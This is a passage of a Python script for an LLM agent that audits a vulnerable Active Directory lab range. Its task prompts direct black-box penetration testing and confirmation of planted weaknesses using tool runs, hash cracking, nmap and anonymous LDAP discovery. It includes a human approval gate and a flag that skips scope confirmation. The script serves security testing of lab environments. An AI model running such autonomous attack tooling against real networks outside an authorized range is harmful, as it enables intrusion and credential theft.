    step_log_path = _init_step_log(_MF.get("range_id", "range"), step_log_dir)
    print(f"[QA] 逐步 log: {step_log_path}")

    # Observer Agent 初始化 (選用,LLM 因果推理,疊加在逐步 log 之上)
    observer = None
    if getattr(a, "observe", False):
        from observer_agent import ObserverAgent
        observer = ObserverAgent(
            backend=getattr(a, "observer_backend", None) or a.backend,
            model=getattr(a, "observer_model", None) or a.model,
        )
        print(f"[Observer] 觀察員已啟動 (backend={observer.backend}, model={observer.model_name})")

    agent = build_qa_agent(observer=observer)
    config = {"configurable": {"thread_id": a.thread_id}}
    if _NO_MANIFEST:
        task = (f"對探索到的 range (網域 {_MF['ad_domain']}, DC {_MF['machines'][0]['ip']}) "
                f"做黑箱滲透式稽核。沒有種植弱點清單,自己判斷探索順序、要不要嘗試找初始存取、"
                f"要不要用 run_tool/crack_hash/web_fetch_range 深入查,不必照固定步驟走。"
                f"最後給我一份 QA 報告。")
    else:
        task = (f"驗證 range '{_MF['range_id']}' (網域 {_MF['ad_domain']})。"
                f"自己判斷驗證順序,對種下的弱點逐一確認是否真的可利用,遇到卡關可以自己用"
                f"run_tool/crack_hash/web_fetch_range 深入查根因,不必照固定步驟走。"
                f"最後給我一份 QA 報告。")

    from langgraph.types import Command
    result = agent.invoke({"messages": [{"role": "user", "content": task}]}, config)

    # 處理 HITL 中斷 (suggest_fix)
    while "__interrupt__" in result:
        intr = result["__interrupt__"][0].value
        print("\n[HITL] agent 想執行需確認的動作:")
        print(json.dumps(intr, ensure_ascii=False, indent=2)[:800])
        ans = input("approve / reject> ").strip().lower()
        decision = {"type": "approve"} if ans == "approve" else {"type": "reject"}
        result = agent.invoke(Command(resume={"decisions": [decision]}), config)

    # 輸出最終訊息
    print("\n" + "=" * 72)
    print("=== QA 報告 ===")
    final = result["messages"][-1].content
    print(final if isinstance(final, str) else json.dumps(final, ensure_ascii=False, indent=2))

    # Observer 報告輸出
    if observer:
        output_dir = getattr(a, "observer_output", None) or "."
        observer.generate_report(
            range_id=_MF.get("range_id", "unknown"), mode=_MODE,
            infra_ok=True, output_dir=output_dir,
        )
        print(f"[Observer] 觀察報告已儲存")


def build_parser():
    p = argparse.ArgumentParser(prog="qa_agent",
                                formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    p.add_argument("--manifest", default="range_manifest.json",
                   help="range manifest 路徑;檔案不存在時自動轉入無 manifest 探索模式"
                        " (需搭配 --network-cidr 或 --dc-ip)")
    p.add_argument("--mode", choices=["blackbox", "whitebox"], default="blackbox",
                   help="blackbox=只用 QA 帳號測可利用性; whitebox=額外允許根因檢查")
    # 無 manifest 探索模式
    p.add_argument("--network-cidr", default=None,
                   help="[無 manifest 模式] 要探索的網段,如 10.2.10.0/24;找 DC 用")
    p.add_argument("--ad-domain", default=None,
                   help="[無 manifest 模式] 已知網域名;不給則嘗試匿名 LDAP 探索")
    p.add_argument("--dc-ip", default=None,
                   help="[無 manifest 模式] 已知 DC IP;給了就跳過 nmap 探索")
    p.add_argument("--qa-user", default=None,
                   help="[無 manifest 模式] 供已驗證檢測項目使用的帳號")
    p.add_argument("--qa-pass", default=None,
                   help="[無 manifest 模式] 供已驗證檢測項目使用的密碼")
    p.add_argument("--backend", choices=["openai", "ollama", "local-openai", "cloud"], default="ollama")
    p.add_argument("--model", default=None, help="LLM 模型 (建議 tool-calling 強的,如 llama4:scout)")
    p.add_argument("--ollama-base-url", default=None)
    p.add_argument("--thread-id", default="qa-run-001")
    p.add_argument("--yes", action="store_true", help="跳過測試前的範圍確認")
    # Observer Agent
    p.add_argument("--observe", action="store_true",
                   help="啟用觀察員 Agent,詳細記錄每步檢測的指令、結果、排查方式、因果推理")
    p.add_argument("--observer-output", default=None,
                   help="觀察員報告輸出目錄 (預設當前目錄)")
    p.add_argument("--observer-backend", default=None,
                   help="觀察員 LLM 後端 (預設與 --backend 相同)")
    p.add_argument("--observer-model", default=None,
                   help="觀察員 LLM 模型 (預設與 --model 相同)")
    return p


if __name__ == "__main__":
    run(build_parser().parse_args())
